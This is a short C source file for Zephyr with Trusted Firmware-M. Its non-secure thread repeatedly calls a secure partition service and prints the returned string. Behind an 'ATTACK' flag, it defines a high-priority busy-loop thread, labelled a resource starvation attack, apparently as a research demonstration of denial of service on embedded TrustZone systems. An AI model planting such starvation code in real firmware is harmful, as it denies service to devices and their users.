#include <zephyr.h>
#include <tfm_veneers.h>
#include <tfm_ns_interface.h>
#include "psa/client.h"
#include "psa_manifest/sid.h"

/* This define activate the resource starvation attack. */
#define ATTACK 1


psa_status_t secure_function(void *p_string, size_t string_len)
{
    psa_status_t status;
    psa_outvec out_vec[] = {
        { .base = p_string, .len = string_len }
    };

    status = psa_call(TFM_SC_SET_PROCESS_HANDLE, PSA_IPC_CALL, NULL, 0, out_vec, IOVEC_LEN(out_vec));
    return status; 
}


void main(void)
{
    printk("Starting NSPE Thread\n");
    char str[80];
    size_t str_len = 80;
    while(true) {
        k_msleep(2*1000);

        psa_status_t status = secure_function(str, str_len);
        if (status != PSA_SUCCESS) {
            printk("status: %d\n", status);
        } else {
            printk("%s \n", str);
        }
    } 
}

#if ATTACK == 1
#define STACKSIZE 1024
#define PRIORITY    1

volatile uint64_t d = 0;

void dummy(void){
  while(true){
    d++;
  }
}

K_THREAD_DEFINE(dummy_thread_id, STACKSIZE, dummy, NULL, NULL, NULL, PRIORITY, 0, 0);
#endif /* ATTACK == 1 */
